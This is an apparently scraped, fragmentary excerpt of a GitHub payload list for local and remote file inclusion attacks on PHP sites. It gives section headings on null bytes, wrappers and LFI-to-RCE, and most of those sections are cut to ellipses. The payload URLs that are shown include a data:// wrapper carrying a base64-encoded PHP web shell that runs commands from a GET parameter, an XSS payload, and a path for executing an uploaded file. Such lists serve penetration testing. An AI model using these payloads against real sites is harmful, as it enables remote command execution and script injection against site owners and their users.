...
#### [](https://github.com/payloadbox/rfi-lfi-payload-list#basic-lfi-null-byte-double-encoding-and-other-tricks-)Basic LFI (null byte, double encoding and other tricks) :
...
#### [](https://github.com/payloadbox/rfi-lfi-payload-list#basic-rfi-null-byte-double-encoding-and-other-tricks-)Basic RFI (null byte, double encoding and other tricks) :
...
#### [](https://github.com/payloadbox/rfi-lfi-payload-list#lfi--rfi-wrappers-)LFI / RFI Wrappers :
...
#### [](https://github.com/payloadbox/rfi-lfi-payload-list#lfi-wrapper-zip-)LFI Wrapper ZIP :
...
#### [](https://github.com/payloadbox/rfi-lfi-payload-list#rfi-wrapper-data-with--payload-)RFI Wrapper DATA with "" payload :

```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

#### [](https://github.com/payloadbox/rfi-lfi-payload-list#rfi-wrapper-expect-)RFI Wrapper EXPECT :
...
#### [](https://github.com/payloadbox/rfi-lfi-payload-list#xss-via-rfilfi-with--payload-)XSS via RFI/LFI with "" payload :

```
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

#### [](https://github.com/payloadbox/rfi-lfi-payload-list#lfi-to-rce-via-procfd-)LFI to RCE via /proc/*/fd :
...
#### [](https://github.com/payloadbox/rfi-lfi-payload-list#lfi-to-rce-via-upload-)LFI to RCE via Upload :

```
http://example.com/index.php?page=path/to/uploaded/file.png
```

#### [](https://github.com/payloadbox/rfi-lfi-payload-list#references-)References :
```